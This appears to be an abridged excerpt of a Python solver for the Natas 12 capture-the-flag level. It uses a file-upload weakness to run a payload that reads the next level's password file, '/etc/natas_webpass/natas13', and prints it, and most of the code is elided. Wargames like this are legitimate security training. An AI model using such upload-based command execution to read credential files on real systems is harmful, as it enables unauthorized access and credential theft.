...
def getpass(url, user, password, path, proxies=None):
    ...
    payload = 'cat /etc/natas_webpass/natas13'
    ...
    print(f"[+] The password of natas13 is: {passwd}")

def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Grabs the password of natas13 by exploiting a file upload to read the password file.")
    parser.add_argument('-p', '--password', help='Password of Natas12.', required=True, metavar='Password')
